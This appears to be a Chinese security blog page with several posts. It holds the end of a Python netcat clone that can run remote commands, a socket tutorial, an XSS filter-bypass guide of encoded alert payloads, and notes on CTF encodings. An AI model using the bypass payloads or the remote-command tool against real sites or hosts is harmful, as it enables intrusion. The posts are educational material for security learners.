+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def server_handler(<span class="keyword">self</span>):</div><div class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.client_socket:</div><div class="line">            <span class="keyword">if</span> <span class="keyword">self</span>.args.e:</div><div class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                    cmd_buffer = <span class="keyword">self</span>.get_client_input_buffer()</div><div class="line">                    response = <span class="keyword">self</span>.run_command(cmd_buffer)</div><div class="line">                    <span class="keyword">self</span>.client_socket.send(response)</div><div class="line">            elif <span class="keyword">self</span>.args.u:</div><div class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        file_buffer = <span class="keyword">self</span>.get_client_input_buffer()</div><div class="line">                        file_buffer = file_buffer.decode(<span class="string">'utf-8'</span>)</div><div class="line">                        dest = <span class="keyword">self</span>.args.u</div><div class="line">                        <span class="keyword">with</span> open(dest, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">                            f.write(file_buffer)</div><div class="line">                            f.close()</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</div><div class="line">                        err_message = traceback.format_exc()</div><div class="line">                        err_message.encode(<span class="string">'utf-8'</span>)</div><div class="line">                        <span class="keyword">self</span>.client_socket.send(err_message)</div></pre></td></tr></table></figure>
+<p>如果存在e参数，则为执行命令模式。从客户端接收命令，然后调用<code>run_command()</code>处理。如果存在u参数，则为文件上传模式，从客户端接收文件，定义文件路径（包括文件名），然后写入。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(self, command)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=<span class="keyword">True</span>)</div><div class="line">            <span class="keyword">return</span> output</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</div><div class="line">            error_message = traceback.format_exc()</div><div class="line">            <span class="keyword">return</span> error_message.encode(<span class="string">'utf-8'</span>)</div></pre></td></tr></table></figure>
+<p>这里执行命令，调用了subprocess模块的check_output方法，第一个参数为执行的命令。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def client_mode(<span class="keyword">self</span>):</div><div class="line">        address = <span class="keyword">self</span>.args.a</div><div class="line">        port = <span class="keyword">self</span>.args.p</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">            server_socket.connect((address, port))</div><div class="line">        except <span class="keyword">Exception</span> <span class="keyword">as</span> err:</div><div class="line">            <span class="keyword">print</span>(err)</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">self</span>.server_socket = server_socket</div><div class="line">        <span class="keyword">self</span>.client_handler()</div></pre></td></tr></table></figure>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.args.<span class="symbol">f:</span></div><div class="line">            file_name = <span class="keyword">self</span>.args.f</div><div class="line">            file_buffer = <span class="string">''</span></div><div class="line">            with open(file_name, <span class="string">'r'</span>) as <span class="symbol">f:</span></div><div class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> <span class="symbol">f:</span></div><div class="line">                    file_buffer += line</div><div class="line">                file_buffer.encode(<span class="string">'utf-8'</span>)</div><div class="line">                f.close()</div><div class="line">            <span class="keyword">self</span>.server_socket.send(file_buffer.encode(<span class="string">'utf-8'</span>))</div><div class="line">        elif <span class="keyword">self</span>.args.<span class="symbol">e:</span></div><div class="line">        	<span class="keyword">while</span> <span class="symbol">True:</span></div><div class="line">            	cmd = input()</div><div class="line">            	<span class="keyword">self</span>.server_socket.send(cmd.encode(<span class="string">'utf-8'</span>))</div><div class="line">            	data = <span class="keyword">self</span>.server_socket.recv(<span class="number">1024</span>)</div><div class="line">            	print(data.decode(<span class="string">'utf-8'</span>))</div></pre></td></tr></table></figure>
+<p>客户端的实现也是类似，理解应该不是问题。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">test </span>= netcat()</div></pre></td></tr></table></figure>
+<p>当然，当然，最后，还得调用一下。<br>至此，一个相当的简陋的netcat算是完工了，我们跑起来测试一下。<br><img src="/images/netcat/netcat.png" alt="测试截图"></p>
+<p>提醒一下，py3当中socket不管收发都是用的bytes而非str，所以编写的时候要注意了。<br>代码还有很多问题，并且功能非常简陋，这个只是作为demo展示。如果你有更好的想法，欢迎在我的<a href="https://github.com/Dollarsss/netcat" target="_blank" rel="external">github</a>上留言。(别太care头像..)<br>最后，这段代码的思路参考了《python黑帽子：黑客与渗透测试编程之道》，目前中文版好像没有电子版，大家有兴趣可以买来阅读，当然，英语好的直接阅读原版就好。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/06/25/python中socket模块的使用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/06/25/python中socket模块的使用/" itemprop="url">python中socket模块的使用</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-25T17:21:37+08:00">
+                2017-06-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/python/" itemprop="url" rel="index">
+                    <span itemprop="name">python</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p>在python安全编程的世界当中，socket是和requests并驾齐驱，必须要掌握的一个模块。因为应用层上除了WEB的行为，你基本上都要使用socket去完成。<br><img src="http://static.oschina.net/uploads/space/2014/1103/154553_SGq0_1378445.jpg?_=5730135" alt=""><br>那么什么是socket呢？简单来说，就是区分同一服务器上不同应用程序的标识。其目的是为了完成从A主机上X进程到B主机上Y进程的通信。因此socket是工作在应用层和传输层之间的。如果你对什么是socket，什么是TCP,UDP不了解，建议阅读<a href="http://www.cnblogs.com/hissia/p/5730135.html" target="_blank" rel="external">这篇文章</a>，如果你从来没学过计算机网络，则请阅读<a href="http://blog.csdn.net/yaopeng_2005/article/details/7064869" target="_blank" rel="external">这篇文章</a>。</p>
+<p>注意，socket和socket模块是不一样的，这篇文章主要介绍socket模块的使用。</p>
+<h4 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h4><p>先让我们来看一个小小的Demo</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import <span class="built_in">socket</span></div><div class="line"></div><div class="line"></div><div class="line">s = <span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET, <span class="built_in">socket</span>.SOCK_STREAM)</div></pre></td></tr></table></figure>
+<p>首先socket.socket是一个类，我们将其实例化之后传递给s，而实例化的参数如下：</p>
+<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socket.socket(<span class="attr">family=AF_INET,</span> <span class="attr">type=SOCK_STREAM,</span> <span class="attr">proto=0,</span> <span class="attr">fileno=None)</span></div></pre></td></tr></table></figure>
+<p>family用于指定套接族，type用于指定套接类型，proto用于指定协议。</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">family</th>
+<th style="text-align:right">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">AF_UNIX</td>
+<td style="text-align:right">unix系统本地通信</td>
+</tr>
+<tr>
+<td style="text-align:left">AF_INET</td>
+<td style="text-align:right">ipv4通信</td>
+</tr>
+<tr>
+<td style="text-align:left">AF_INET6</td>
+<td style="text-align:right">ipv6通信</td>
+</tr>
+</tbody>
+</table>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">type</th>
+<th style="text-align:right">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SOCK_STREAM</td>
+<td style="text-align:right">基于TCP的流式socket通信</td>
+</tr>
+<tr>
+<td style="text-align:left">SOCK_DGRAM</td>
+<td style="text-align:right">基于UDP的数据包式通信</td>
+</tr>
+<tr>
+<td style="text-align:left">SOCK_RAW</td>
+<td style="text-align:right">原始套接字</td>
+</tr>
+</tbody>
+</table>
+<p>以上只是一部分，更多细节请参考官方手册。<br>完成初始化之后，就可以调用socket类的方法了。</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s.connect(('<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>', <span class="number">12345</span>))</div></pre></td></tr></table></figure>
+<p>在上面的demo当中，调用了connect方法。该方法传入一个address参数，该参数为元组形式，包括地址以及端口。意思就是建立连接，只有建立连接之后才能有后续动作。<br>(注：python3.5之后该方法超时不再引发InterruptedError)</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">while</span> True:</div><div class="line">	<span class="built_in">text</span> = input(<span class="string">'please input...'</span>)</div><div class="line">	<span class="built_in">print</span>()</div><div class="line">	s.send(<span class="built_in">text</span>.encode(<span class="string">'ascii'</span>))</div><div class="line">	data = s.recv(<span class="number">1024</span>)</div><div class="line">	<span class="built_in">print</span>(data.decode(<span class="string">'ascii'</span>))</div></pre></td></tr></table></figure>
+<p>recv方法传入一个bufsize参数，指定接收内容的大小。执行成功返回bytes对象。<br>send则是相反，发送一个bytes对象到对应客户端。因此，发送或接收时注意不要发送str对象，而应发送bytes对象。<br>(注：在python2中则为发送接收str对象)</p>
+<p>接下来开始服务器端的编写</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import <span class="built_in">socket</span></div><div class="line"></div><div class="line">s = <span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET, <span class="built_in">socket</span>.SOCK_STREAM)</div><div class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">12345</span>))</div></pre></td></tr></table></figure>
+<p>这里调用了bind方法。作用在于绑定主机地址和端口号，建立一个服务端的socket进程。<br>（注：这里如果写localhost或是127.0.0.1只能本机访问，如果需要让别的主机访问，可以使用<code>socket.gethostname()</code>。）</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	conn, addr = s.accept()</div><div class="line">	<span class="keyword">print</span>(<span class="string">'connected by '</span>,addr)</div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		data = conn.recv(<span class="number">1024</span>)</div><div class="line">		<span class="keyword">print</span>(data.decode(<span class="string">'ascii'</span>))</div><div class="line">		conn.send(b<span class="string">'server received you message'</span>)</div></pre></td></tr></table></figure>
+<p>accept的方法是接受客户端发起的connect请求，该方法返回一个元组，包含一个新的socket对象以及地址对。在后续阶段，将使用这个新的socket对象与客户端进行交互。</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s.<span class="built_in">close</span>()</div></pre></td></tr></table></figure>
+<p>最后，在使用完成之后，记得关闭套接字。<br>至此，一个基本的通过socket通信的程序已经基本完成。</p>
+<h4 id="0x03-补充"><a href="#0x03-补充" class="headerlink" title="0x03 补充"></a>0x03 补充</h4><p>如果你还对socket的实际应用不太了解，建议多阅读<a href="https://www.exploit-db.com/" target="_blank" rel="external">exploit-db</a>上面的一些EXP，相当多都用到了socket。<br>如前阵子的<a href="https://www.exploit-db.com/exploits/42031/" target="_blank" rel="external">永恒之蓝</a>，又如14年臭名昭著的<a href="https://www.exploit-db.com/exploits/32745/" target="_blank" rel="external">心脏滴血</a>。</p>
+<p>当然socket的用途绝不仅限于编写EXP，但是通过阅读EXP，理解socket的本质，做到举一反三，对你非常有帮助。</p>
+<p>如果你对socket的一些细节用法不太了解，请手动查阅官方文档。</p>
+<h4 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h4><p><a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71" target="_blank" rel="external">python-socket详细介绍</a></p>
+<p><a href="https://docs.python.org/3/library/socket.html" target="_blank" rel="external">socket官方文档(3.5)</a></p>
+<p><a href="https://docs.python.org/2/howto/sockets.html" target="_blank" rel="external">基于python2的官方tutorial</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/05/27/XSS不完全指南/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/05/27/XSS不完全指南/" itemprop="url">XSS不完全指南</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-27T14:20:34+08:00">
+                2017-05-27
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/XSS/" itemprop="url" rel="index">
+                    <span itemprop="name">XSS</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="XSS不完全指南-绕过篇"><a href="#XSS不完全指南-绕过篇" class="headerlink" title="XSS不完全指南(绕过篇)"></a>XSS不完全指南(绕过篇)</h2><p>笔者在刚接触XSS的时候觉得XSS很简单，不就是注入<code>alert(1)</code>嘛。直到最近从新开始研究XSS，才发现，XSS套路太深。因此希望通过文字总结经验，让自己有所收获。</p>
+<h3 id="1-ES6"><a href="#1-ES6" class="headerlink" title="1.ES6"></a>1.ES6</h3><p>ES6中更新了许多新特性，看图：<br><img src="/images/XSS不完全指南/1495704711780.png" alt="ES6新特性"><br>根据这些特性，首先想到的是，注入JS代码可以不用<code>&#39;</code>,<code>&quot;</code>，直接使用</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">alert</span><span class="params">(`abc`)</span></span></div></pre></td></tr></table></figure>
+<p>再看图最下方的特性，允许前面调用标签，即函数。而传入的值则为模板字符串。那么注入代码简写为：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">alert`abc`</div></pre></td></tr></table></figure>
+<p>同时，ES6中允许使用码点表示UNICODE字符。例：<code>\u0001</code><br>那么，注入代码将如下:</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">\u</span>0061<span class="symbol">\u</span>006c<span class="symbol">\u</span>0065<span class="symbol">\u</span>0072<span class="symbol">\u</span>0074`A`</div></pre></td></tr></table></figure>
+<h3 id="2-HTML-5-实体编码"><a href="#2-HTML-5-实体编码" class="headerlink" title="2.HTML(5)实体编码"></a>2.HTML(5)实体编码</h3><p><img src="/images/XSS不完全指南/1495712162824.png" alt="HTML5实体编码"><br>比较常用的是<code>&lt;</code> <code>&gt;</code> <code>=</code> <code>&#39;</code><br>代码构造如下：</p>
+<figure class="highlight crmsh"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&amp;<span class="keyword">lt</span>;script&amp;<span class="keyword">gt</span>;alert`<span class="number">1</span>`&amp;<span class="keyword">lt</span>;/script&amp;<span class="keyword">gt</span>;</div></pre></td></tr></table></figure>
+<p>在HTML5中，新增了一些新的实体编码名称。如：<code>&amp;colon;</code> <code>&amp;NewLine;</code><br>则可构造：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript&amp;colon;alert</span>`<span class="attr">abc</span>` /&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javas&amp;NewLine;criptalert</span>`<span class="attr">abc</span>` /&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="3-URL编码"><a href="#3-URL编码" class="headerlink" title="3.URL编码"></a>3.URL编码</h3><p><img src="/images/XSS不完全指南/1495720543817.png" alt="URL编码"><br>这个就是老生常谈了。随便举个栗子：</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">%</span><span class="number">3</span>Cscript<span class="meta">%</span><span class="number">3</span>Ealert<span class="meta">%</span><span class="number">281</span><span class="meta">%</span><span class="number">29</span><span class="meta">%</span><span class="number">3</span>B<span class="meta">%</span><span class="number">3</span>C<span class="meta">%</span><span class="number">2</span>Fscript<span class="meta">%</span><span class="number">3</span>E<span class="comment">//&lt;script&gt;alert(1)&lt;/script&gt;</span></div></pre></td></tr></table></figure>
+<p>但是现在这种漏洞不容易触发，原因是因为许多网站后端都对双引号有解码过滤机制。</p>
+<h3 id="4-JS进制转换"><a href="#4-JS进制转换" class="headerlink" title="4.JS进制转换"></a>4.JS进制转换</h3><p>JS中会自动对以<code>\</code>开头的部分格式字符进行转换。如<code>\xnn</code>(十六进制),<code>\nnn</code>(八进制)，因此可构造如下：</p>
+<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">document.write("<span class="symbol">\7</span>4<span class="symbol">\1</span>63<span class="symbol">\1</span>43<span class="symbol">\1</span>62<span class="symbol">\1</span>51<span class="symbol">\1</span>60<span class="symbol">\1</span>64<span class="symbol">\7</span>6<span class="symbol">\1</span>41<span class="symbol">\1</span>54<span class="symbol">\1</span>45<span class="symbol">\1</span>62<span class="symbol">\1</span>64<span class="symbol">\5</span>0<span class="symbol">\6</span>1<span class="symbol">\5</span>1<span class="symbol">\7</span>4<span class="symbol">\5</span>7<span class="symbol">\1</span>63<span class="symbol">\1</span>43<span class="symbol">\1</span>62<span class="symbol">\1</span>51<span class="symbol">\1</span>60<span class="symbol">\1</span>64<span class="symbol">\7</span>6");</div><div class="line">//&lt;script&gt;alert(1)&lt;/script&gt;</div></pre></td></tr></table></figure>
+<h3 id="5-利用data协议"><a href="#5-利用data协议" class="headerlink" title="5.利用data协议"></a>5.利用data协议</h3><p>关于HTML中的data协议，可以点击<a href="http://www.cnblogs.com/hustskyking/p/data-uri.html" target="_blank" rel="external">这里</a></p>
+<p>总的来讲，data协议就是用文本流的方式，在HTML页面中插入文件。这里的文件形态即为<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="external">MIME-TYPE</a>。<br>使用方式如下：</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">data:[<span class="string">&lt;mime type&gt;</span>][<span class="symbol">;charset=&lt;charset&gt;</span>][<span class="string">;base64</span>],<span class="xml"><span class="tag">&lt;<span class="name">encoded</span> <span class="attr">data</span>&gt;</span></span></div></pre></td></tr></table></figure>
+<p>可以看到，当中可指定base64选项，即采用base64进行解码。注入代码可构造为：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="</span>&gt;</span>click<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="6-空格的替代"><a href="#6-空格的替代" class="headerlink" title="6.空格的替代"></a>6.空格的替代</h3><p>在HTML中可以使用<code>/</code>代替空格，这也是老套路了。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span>/<span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></div></pre></td></tr></table></figure>
+<p>当然，除了<code>/</code>之外，还有<code>%0A</code>(换行符),<code>%0C</code>(换页符),<code>%0D</code>(回车符)。有兴趣自己尝试。</p>
+<p>而在JS当中，则可以通过<code>/**/</code>空注释来代替空格</p>
+<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;a/href=javascript:<span class="function"><span class="keyword">function</span>/**/<span class="title">ok</span><span class="params">()</span>&#123;<span class="title">alert</span><span class="params">(1)</span>&#125;/**/<span class="title">ok</span><span class="params">()</span>;&gt;<span class="title">xss</span>&lt;/<span class="title">a</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="7-运算符的利用"><a href="#7-运算符的利用" class="headerlink" title="7.运算符的利用"></a>7.运算符的利用</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.<span class="built_in">write</span>(<span class="string">"xxxx &#123;input&#125; xxxx"</span>)</div></pre></td></tr></table></figure>
+<p>input构造：</p>
+<figure class="highlight actionscript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'-alert(1)-'</span></div></pre></td></tr></table></figure>
+<p>最终变成：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">document.write(<span class="string">"xxxx"</span>-alert(<span class="number">1</span>)-<span class="string">"xxxx"</span>)<span class="comment">;</span></div></pre></td></tr></table></figure>
+<p>而在JS当中，运算中的子单元，如果是JS代码，会自动执行。因此成功弹窗。</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/04/26/CTF中常用编码/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="D_infinite">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="D_infinite的小站">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/04/26/CTF中常用编码/" itemprop="url">CTF中常用编码</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-04-26T14:05:00+08:00">
+                2017-04-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/MISC/" itemprop="url" rel="index">
+                    <span itemprop="name">MISC</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>在ctf中crypto题中，需要用到大量的各种编码解码，而且基本上需要使用python编写，因此，希望记录下来，方便日后查看。</p>
+<h3 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="title">ord</span><span class="params">(asciiChar)</span></span><span class="comment">//得到对应ascii值</span></div><div class="line"><span class="function"><span class="title">chr</span><span class="params">(asciiNum)</span></span><span class="comment">//得到对应ascii码</span></div></pre></td></tr></table></figure>
+<h3 id="BASE64-32-16"><a href="#BASE64-32-16" class="headerlink" title="BASE64/32/16"></a>BASE64/32/16</h3><p>可以将8位字节转化为6位，5位，4位。常用的为64位编码。模块为<code>base64</code></p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">code</span>=b<span class="string">"abc"</span></div><div class="line">code2b64=base64.b64encode(<span class="keyword">code</span>)<span class="comment">//b'YWJj'</span></div><div class="line">b642code=base64.b64decode(code2b64)<span class="comment">//b'abc'</span></div></pre></td></tr></table></figure>
